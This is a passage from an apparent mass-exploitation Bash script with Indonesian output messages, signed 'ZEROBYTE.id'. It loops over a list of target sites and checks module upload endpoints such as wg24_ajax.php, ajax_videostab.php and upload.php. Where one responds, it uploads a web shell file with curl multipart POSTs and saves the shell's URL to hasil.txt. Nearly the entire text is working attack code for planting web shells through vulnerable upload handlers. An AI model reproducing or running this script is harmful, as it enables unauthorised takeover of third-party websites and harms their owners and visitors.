	intip20=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[20]}/ajax/upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar20}" ] || [ "000" == "${kamar20}" ] || [ "403" == "${kamar20}" ] || [ "301" == "${kamar20}" ] || [ "500" == "${kamar20}" ] || [ "302" == "${kamar20}" ]; then
		echo "JENDELA ${moduleslist[20]} TERTUTUP" 
#false
elif
	[ "210" == "${kamar20}" ] && [ "error" == "${intip20}" ]; then
	echo "JENDELA ${moduleslist[20]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[20]}"
	# Save URL
	liatxploit20=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[20]}/wg24_ajax.php" | egrep -o "success")
if [ "success" == "${liatxploit20}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[20]}/img/upload/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[20]} TERGEMBOK"
	fi
	printf ${NC}
	kamar21=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[21]}/wg24_ajax.php")
	intip21=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[21]}/wg24_ajax.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar21}" ] || [ "000" == "${kamar21}" ] || [ "403" == "${kamar21}" ] || [ "301" == "${kamar21}" ] || [ "500" == "${kamar21}" ] || [ "302" == "${kamar21}" ]; then
		echo "JENDELA ${moduleslist[21]} TERTUTUP" 
#false
elif
	[ "221" == "${kamar21}" ] && [ "error" == "${intip21}" ]; then
	echo "JENDELA ${moduleslist[21]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[21]}"
	# Save URL
	liatxploit21=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[21]}/ajax_videostab.php?action=submitUploadVideo%26id_product=upload" | egrep -o "success")
if [ "success" == "${liatxploit21}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[21]}/uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[21]} TERGEMBOK"
	fi
	printf ${NC}
	kamar22=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[22]}/ajax_videostab.php?action=submitUploadVideo%26id_product=upload")
	intip22=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[22]}/ajax_videostab.php?action=submitUploadVideo%26id_product=upload" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar22}" ] || [ "000" == "${kamar22}" ] || [ "403" == "${kamar22}" ] || [ "301" == "${kamar22}" ] || [ "500" == "${kamar22}" ] || [ "302" == "${kamar22}" ]; then
		echo "JENDELA ${moduleslist[22]} TERTUTUP" 
#false
elif
	[ "231" == "${kamar22}" ] && [ "error" == "${intip22}" ]; then
	echo "JENDELA ${moduleslist[22]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[22]}"
	# Save URL
	liatxploit22=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[22]}/upload.php" | egrep -o "success")
if [ "success" == "${liatxploit22}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[22]}/uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[22]} TERGEMBOK"
	fi
	printf ${NC}
	kamar23=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[23]}/upload.php")
	intip23=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[23]}/upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar23}" ] || [ "000" == "${kamar23}" ] || [ "403" == "${kamar23}" ] || [ "301" == "${kamar23}" ] || [ "500" == "${kamar23}" ] || [ "302" == "${kamar23}" ]; then
		echo "JENDELA ${moduleslist[23]} TERTUTUP" 
#false
elif
	[ "241" == "${kamar23}" ] && [ "error" == "${intip23}" ]; then
	echo "JENDELA ${moduleslist[23]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[23]}"
	# Save URL
	liatxploit23=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[23]}/upload.php" | egrep -o "success")
if [ "success" == "${liatxploit23}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[23]}/uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[23]} TERGEMBOK"
	fi
	printf ${NC}
	kamar24=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[24]}/upload.php")
	intip24=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[24]}/upload.php" 2>&1 | egrep -o "error") 
	#sleep 1
	if [ "404" == "${kamar24}" ] || [ "000" == "${kamar24}" ] || [ "403" == "${kamar24}" ] || [ "301" == "${kamar24}" ] || [ "500" == "${kamar24}" ] || [ "302" == "${kamar24}" ]; then
		echo "JENDELA ${moduleslist[24]} TERTUTUP" 
#false
elif
	[ "200" == "${kamar24}" ] && [ "error" == "${intip24}" ]; then
	echo "JENDELA ${moduleslist[24]} TERBUKA"
	echo "USAHA NGITIPIN ${moduleslist[24]}"
	# Save URL
	liatxploit24=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[24]}/file_upload.php" | egrep -o "success")
if [ "success" == "${liatxploit24}" ]; then
	printf ${cyan}
	echo "+++++++++++++++++++++++++++++++++++++++++"
	echo "!!! TERLIHAT SUDAH !!!"
	echo "AKSESNYA => : ${url}/modules/${moduleslist[24]}/file_uploads/${fshell}" | tee -a hasil.txt
	echo "+++++++++++++++++++++++++++++++++++++++++"
fi 
else
	printf ${red}
	echo "MODULE ${moduleslist[24]} TERGEMBOK"
	fi 
		printf ${NC}
			done < "$slist"

printf "${red}ZEROB${white}YTE.id\n";
printf "${NC}\n"
